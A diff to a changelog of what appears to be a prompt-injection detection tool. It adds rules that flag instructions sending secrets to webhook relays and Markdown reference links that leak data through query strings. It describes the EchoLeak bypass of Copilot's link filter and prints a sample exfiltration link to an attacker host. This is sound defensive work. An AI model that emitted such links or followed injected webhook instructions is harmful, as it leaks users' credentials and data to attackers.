@@ -12,6 +12,28 @@ what got documented across releases.
 
 ## [Unreleased]
 
+### Hardened
+
+- Added detection for instructions that direct an AI agent to POST data to public webhook relay
+  services (`exfil_webhook_relay`, score 70). The rule covers two scenarios: (1) HTTP-capture-only
+  services such as webhook.site, requestcatcher.com, and beeceptor.com — used exclusively for
+  request inspection and never legitimately in production agent workflows — appearing alongside
+  data-send verbs; (2) mainstream notification webhooks (Discord, Slack, Zapier, Make, n8n)
+  appearing within the same instruction as sensitive-data terms such as "system prompt", "API key",
+  or "credentials". Multiple 2025–2026 incidents documented prompt-injection attacks that sent
+  stolen conversation context to attacker-controlled Discord webhooks, bypassing DLP controls
+  because webhook traffic resembles legitimate bot-notification traffic.
+
+- Added output-side detection for Markdown reference-style link definitions that carry a
+  long query-parameter value (`out_markdown_ref_exfil`, score 60). This fills the specific bypass
+  gap exploited in CVE-2025-32711 (EchoLeak, CVSS 9.3, June 2025): while Microsoft Copilot's
+  link-redaction filter scrubbed inline `![alt](url)` image URLs, it did not touch reference
+  definitions of the form `[label]: https://attacker.com?data=<encoded>` at the bottom of a
+  document. Markdown renderers auto-fetched these URLs, silently exfiltrating corporate data
+  encoded in the query parameter. Reference-style links with query values 16+ characters long
+  are rarely produced in legitimate AI responses; in AI-processed documents they are a strong
+  indicator of covert data embedding.
+
 ## [1.1.7] - 2026-05-19
 
 ### Hardened
